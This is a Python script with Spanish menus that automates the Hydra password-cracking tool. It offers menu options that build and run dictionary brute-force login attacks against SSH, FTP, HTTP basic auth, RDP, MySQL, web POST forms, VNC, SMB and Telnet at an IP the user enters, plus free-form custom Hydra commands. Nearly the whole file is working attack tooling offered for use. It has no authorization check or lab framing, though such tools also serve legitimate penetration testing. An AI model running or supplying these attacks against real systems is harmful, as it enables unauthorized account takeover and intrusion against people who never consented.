import subprocess
import readline
import ayuda_hydra
from colorama import Fore, Style, init

# Inicializar colorama
init(autoreset=True)

# Diccionario de opciones y comandos Hydra
opciones = {
    1: "Ataque SSH",
    2: "Ataque FTP",
    3: "HTTP Basic Authentication",
    4: "Ataque RDP",
    5: "Ataque MySQL",
    6: "Ataque Web con POST",
    7: "Ataque VNC",
    8: "Ataque SMB",
    9: "Ataque Telnet",
    10: "Help", 
    11: "Mostrar opciones", 
    12: "Salir",
    13: "Hydra propio"
}

# Función para ejecutar Hydra
def run_hydra(command: list | str):
    try:
        print(Fore.BLUE + f"\nEjecutando: {' '.join(command)}\n")

        if input("¿Deseas modificar el comando? (s/n): ").lower() == "s":
            command = modificar_comando(' '.join(command)).split()

        output = subprocess.run(command, capture_output=True, text=True)
        print(output.stdout)

        if output.stderr:
            print(Fore.RED + f"Error durante el ataque: {output.stderr}")
            return

        print(Fore.GREEN + "✅ Hydra ejecutado correctamente.")
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"❌ Error ejecutando Hydra: {e}")

# Mostrar opciones
def mostrar_opt():
    print(Fore.YELLOW + "\n🔹 Opciones disponibles:")
    for key, value in opciones.items():
        print(Fore.WHITE + f"{key}. {value}")

# Modificar comando antes de ejecutarlo
def modificar_comando(comando: str):
    readline.set_startup_hook(lambda: readline.insert_text(comando))
    try:
        return input(Fore.WHITE + "Modificando comando Hydra: ")
    finally:
        readline.set_startup_hook()

# Menú principal
def main():
    print(Fore.WHITE + "\n🔍 Automatización de Hydra\n")
    mostrar_opt()

    while True:
        try:
            opt = int(input(Fore.CYAN + "\nSelecciona una opción, teclea 11 para ver de nuevo las opciones: "))
        except ValueError:
            print(Fore.RED + "⚠️ Opción inválida. Intente de nuevo.")
            continue

        if opt not in opciones:
            print(Fore.RED + "⚠️ Opción inválida. Intente de nuevo.")
            continue

        if opt == 10:
            ayuda_hydra.mostrar_help()
            continue

        if opt == 11:
            mostrar_opt()
            continue

        if opt == 12:
            print(Fore.GREEN + "👋 Saliendo...")
            return
        # Diccionario de comandos Hydra
        comandos = {
            1: lambda: ["hydra", "-l", input("Usuario: "), "-P", input("Diccionario de contraseñas: "), "ssh://" + input("IP: ")],
            2: lambda: ["hydra", "-L", input("Diccionario de usuarios: "), "-P", input("Diccionario de contraseñas: "), "ftp://" + input("IP: ")],
            3: lambda: ["hydra", "-L", input("Diccionario de usuarios: "), "-P", input("Diccionario de contraseñas: "), "http://" + input("IP: "), "-m", input("Ruta protegida: ")],
            4: lambda: ["hydra", "-L", input("Diccionario de usuarios: "), "-P", input("Diccionario de contraseñas: "), "rdp://" + input("IP: ")],
            5: lambda: ["hydra", "-L", input("Diccionario de usuarios: "), "-P", input("Diccionario de contraseñas: "), "mysql://" + input("IP: ")],
            6: lambda: ["hydra", "-L", input("Diccionario de usuarios: "), "-P", input("Diccionario de contraseñas: "), input("IP: "), "http-post-form", input("Ruta POST: ") + ":user=^USER^&pass=^PASS^:F=" + input("Texto de fallo: ")],
            7: lambda: ["hydra", "-P", input("Diccionario de contraseñas: "), "vnc://" + input("IP: ")],
            8: lambda: ["hydra", "-L", input("Diccionario de usuarios: "), "-P", input("Diccionario de contraseñas: "), "smb://" + input("IP: ")],
            9: lambda: ["hydra", "-L", input("Diccionario de usuarios: "), "-P", input("Diccionario de contraseñas: "), "telnet://" + input("IP: ")],
            13: lambda: input("Introduce el comando Hydra personalizado: ").split()
        }

        # Ejecutar comando seleccionado
        command = comandos[opt]()
        run_hydra(command)

if __name__ == '__main__':
    main()
